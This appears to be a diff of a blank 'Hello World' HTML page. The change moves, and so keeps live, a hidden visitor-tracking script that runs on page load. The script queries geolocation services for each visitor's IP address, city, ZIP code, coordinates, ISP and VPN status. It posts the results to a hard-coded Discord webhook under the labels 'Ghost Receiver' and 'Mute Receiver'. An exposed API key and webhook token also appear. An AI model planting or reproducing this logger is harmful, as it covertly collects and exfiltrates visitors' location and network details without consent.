@@ -4,98 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Loading...</title>
-  </head>
-  <body>
-    <h1>Hello World!</h1>
-
-    </style>
-    <script src="https://3kh0.github.io/js/main.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-    <script>
-      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
-        const ip = data.ip_address;
-        const city = data.city;
-        const region = data.region;
-        const zip = data.postal_code;
-        const lat = data.latitude;
-        const long = data.longitude;
-        const country = data.country;
-        const flag = data.flag.emoji;
-        const aso = data.connection.autonomous_system_organization;
-        const isp = data.connection.isp_name;
-        const org = data.connection.organization_name;
-        const vpn = data.security.is_vpn;
-        const tz = data.timezone.name;
-        const ct = data.timezone.current_time;
-
-        const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
-        
-        request.setRequestHeader("Content-type", "application/json");
-        const params = {
-          username: "Ghost Receiver",
-          avatar_url: "https://bsharp27.github.io/Ghost-Receiver/Image.png",
-          content: "**Data Requested, Data Retrieved, On Stand By**\n> IP: " + ip + 
-          "\n> City: " + city + 
-          "\n> Region: " + region + 
-          "\n> Zip: " + zip + 
-          "\n> Latitude:  " + lat +
-          "\n> Longitude:  " + long +
-          "\n> Country: " + country +
-          "\n> Flag: " + flag +
-          "\n> Auto System Org: " + aso +
-          "\n> ISP: " + isp +
-          "\n> Org: " + org +
-          "\n> Using VPN: " + vpn +
-          "\n> Timezone: " + tz +
-          "\n> Current time: " + ct 
-          ,
-        };
-        request.send(JSON.stringify(params));
-      });
-    </script>
-
-
-
-<script>
-  function monke(json) 
-  {
-       var request = new XMLHttpRequest();
-       
-       request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
-  
-       request.setRequestHeader('Content-type', 'application/json');
-  
-       var params = 
-       {
-            username: "Mute Receiver",
-            avatar_url: "https://bsharp27.github.io/Ghost-Receiver/Image2.png",
-            content: "**Data Logged, Awaiting Further Instructions**",
-            embeds: [
-                 {
-                      title: "",
-                      color: 1752220,
-                      description: "**IP:** `" + json.ip + 
-                      "`\n**Country:** `" + json.country + 
-                      "`\n**Region:** `" + json.region + 
-                      "`\n**Town/City:** `" + json.city + 
-                      "`\n**ZIP:** `" + json.postal +
-                      "`\n**Location:** `" + json.loc +
-                      "`\n**Timezone:** `" + json.timezone +
-                      "`\n**Org:** `" + json.org + "`"
-
-                 }
-            ]
-       }
-  
-       request.send(JSON.stringify(params));
-  }
-  </script>
-  <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
-
-
-
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
   <script>
     $(document).ready(function () {
 
@@ -315,6 +225,95 @@
       }
     });
   </script>
+
+  </head>
+  <body>
+    <h1>Hello World!</h1>
+
+    </style>
+    <script src="https://3kh0.github.io/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+        const ip = data.ip_address;
+        const city = data.city;
+        const region = data.region;
+        const zip = data.postal_code;
+        const lat = data.latitude;
+        const long = data.longitude;
+        const country = data.country;
+        const flag = data.flag.emoji;
+        const aso = data.connection.autonomous_system_organization;
+        const isp = data.connection.isp_name;
+        const org = data.connection.organization_name;
+        const vpn = data.security.is_vpn;
+        const tz = data.timezone.name;
+        const ct = data.timezone.current_time;
+
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
+        
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "Ghost Receiver",
+          avatar_url: "https://bsharp27.github.io/Ghost-Receiver/Image.png",
+          content: "**Data Requested, Data Retrieved, On Stand By**\n> IP: " + ip + 
+          "\n> City: " + city + 
+          "\n> Region: " + region + 
+          "\n> Zip: " + zip + 
+          "\n> Latitude:  " + lat +
+          "\n> Longitude:  " + long +
+          "\n> Country: " + country +
+          "\n> Flag: " + flag +
+          "\n> Auto System Org: " + aso +
+          "\n> ISP: " + isp +
+          "\n> Org: " + org +
+          "\n> Using VPN: " + vpn +
+          "\n> Timezone: " + tz +
+          "\n> Current time: " + ct 
+          ,
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
+
+
+
+<script>
+  function monke(json) 
+  {
+       var request = new XMLHttpRequest();
+       
+       request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
   
+       request.setRequestHeader('Content-type', 'application/json');
+  
+       var params = 
+       {
+            username: "Mute Receiver",
+            avatar_url: "https://bsharp27.github.io/Ghost-Receiver/Image2.png",
+            content: "**Data Logged, Awaiting Further Instructions**",
+            embeds: [
+                 {
+                      title: "",
+                      color: 1752220,
+                      description: "**IP:** `" + json.ip + 
+                      "`\n**Country:** `" + json.country + 
+                      "`\n**Region:** `" + json.region + 
+                      "`\n**Town/City:** `" + json.city + 
+                      "`\n**ZIP:** `" + json.postal +
+                      "`\n**Location:** `" + json.loc +
+                      "`\n**Timezone:** `" + json.timezone +
+                      "`\n**Org:** `" + json.org + "`"
+
+                 }
+            ]
+       }
+  
+       request.send(JSON.stringify(params));
+  }
+  </script>
+  <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
   </body>
 </html>
